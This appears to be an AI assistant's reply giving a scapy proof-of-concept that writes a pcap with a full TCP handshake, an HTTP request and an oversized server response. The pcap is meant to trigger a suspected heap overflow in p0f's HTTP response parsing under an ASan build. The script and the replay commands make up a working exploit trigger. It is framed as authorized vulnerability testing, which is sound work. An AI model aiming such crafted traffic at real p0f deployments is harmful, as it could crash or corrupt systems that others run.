The honest version of what this PoC does: it confirms or refutes the theory. Under the conditions you described (copy inside `process_http`, fixed ~1024 destination, clamp still `MAX_FLOW_DATA`), it should trigger an ASan heap-write. If it doesn't fire, that's a real result too and probably means one of the three unverified assumptions was wrong. Treat a non-crash as informative, not as "try harder to break it."

The trigger condition is a single HTTP **response** segment whose payload exceeds the destination buffer (1024). But p0f's state machine won't parse a response until the flow looks like a real HTTP session, so the PoC has to walk the flow through the states you saw: SYN, SYN+ACK, an ACK, a client request (so `http_req_done` gets set), then the oversized server response in a data segment on an established flow. A lone big packet won't reach the vulnerable branch.

Here's a generator using scapy. It writes a pcap; you replay it offline, which is cleaner and more reproducible than live injection.

```python
#!/usr/bin/env python3
# poc_gen.py — builds a pcap that walks a flow to the HTTP response parse path
# with an oversized response segment. For authorized testing on your own box.
from scapy.all import Ether, IP, TCP, Raw, wrpcap

CLI = "10.0.0.10"; SRV = "10.0.0.20"
CP, SP = 44444, 80
OVERSIZE = 4096          # > 1024 dest, < MAX_FLOW_DATA(8192): isolates the dest-size bug

cseq = 1000; sseq = 9000
pkts = []
def seg(src, dst, sport, dport, seq, ack, flags, payload=b""):
    return Ether()/IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
              seq=seq, ack=ack, flags=flags)/Raw(payload) if payload \
           else Ether()/IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
              seq=seq, ack=ack, flags=flags)

# handshake
pkts.append(seg(CLI, SRV, CP, SP, cseq, 0, "S"));            cseq += 1
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "SA"));        sseq += 1
pkts.append(seg(CLI, SRV, CP, SP, cseq, sseq, "A"))

# minimal client request so http_req_done is set
req = b"GET / HTTP/1.1\r\nHost: x\r\n\r\n"
pkts.append(seg(CLI, SRV, CP, SP, cseq, sseq, "PA", req));   cseq += len(req)
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "A"))

# oversized server response segment — the trigger
resp = b"HTTP/1.1 200 OK\r\nServer: " + b"A"*OVERSIZE + b"\r\n\r\n"
pkts.append(seg(SRV, CLI, SP, CP, sseq, cseq, "PA", resp))

wrpcap("poc.pcap", pkts)
print(f"wrote poc.pcap, response payload {len(resp)} bytes")
```

Run it against an ASan build of your target on the lab box:

```
python3 poc_gen.py
p0f -r poc.pcap
```

Notes that matter for whether it fires:

The response payload must land in one segment, since the overflow is per-`memcpy`. Keep it under `MAX_FLOW_DATA` (8192) but over 1024, so a crash points specifically at the destination-size mismatch rather than the general 8 KB cap. If nothing happens, bump `OVERSIZE` toward and past 8192 to check whether the outer clamp is doing anything at all.